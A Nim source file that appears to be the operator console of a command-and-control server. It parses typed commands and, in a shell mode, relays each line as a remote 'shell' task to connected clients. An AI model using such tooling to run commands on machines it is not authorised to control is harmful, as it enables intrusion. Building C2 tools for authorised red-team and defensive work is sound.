import std/[
  asyncdispatch, 
  threadpool, 
  asyncfutures, 
  parseopt, 
  tables,
  strutils, 
  sequtils, 
  json
]

import types, logging, communication

proc procStdin*(server: C2Server) {.async.} =

  let c2cli = server.cli
  c2cli.initialized = true
  c2cli.interactive = true

  prompt(server)

  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      var input = ^messageFlowVar
      
      if "!!" in input:
        input = input.replace("!!", c2cli.lastCommand)
      
      let args = input.split(" ")
      let cmd = args[0]
      
      c2cli.waitingForOutput = false

      if c2cli.mode == ShellMode:
        if cmd == "back":
          c2cli.mode = ClientInteractMode
        else:
          for client in c2cli.handlingClient:
            let task = await client.sendClientTask("shell", %*[ args.join(" ") ])
            if not task.isNil(): 
              c2cli.waitingForOutput = true
      else:
        for command in c2cli.commands:
          if command.name == cmd or cmd in command.aliases:
            c2cli.interactive = false
            if command.cliMode == @[ClientInteractMode] and c2cli.mode != ClientInteractMode:
              errorLog "you must interact with a client to use this command (see 'help interact')"
            elif command.requiresConnectedClient and not filter(c2cli.handlingClient, proc(x: C2Client): bool = x.connected).len == 0:
              errorLog "you can't use this command on a disconnected client"
            else:
              var flags: Table[string, string] = initTable[string, string]()
              var parsedArgs: seq[string] = @[]

              var p = initOptParser(args[1..(len(args)-1)].join(" "))

              while true:
                p.next()
                case p.kind
                of cmdEnd: break
                of cmdShortOption, cmdLongOption:
                  flags[p.key] = p.val
                of cmdArgument:
                  parsedArgs.add(p.key)

              c2cli.lastCommand = input

              let commandFuture = command.execProc(
                cmd=command,
                originalCommand=input,
                flags=flags,
                args=parsedArgs,
                server=server
              )
              proc cb() {.closure, gcsafe.} = 
                if c2cli.waitingForOutput:
                  c2cli.waitingForOutput = false
                  prompt(server)
              asyncCheck commandFuture
              commandFuture.addCallback(cb)

            c2cli.interactive = true

      prompt(server)
      messageFlowVar = spawn stdin.readLine() 
      
    await asyncdispatch.sleepAsync(100)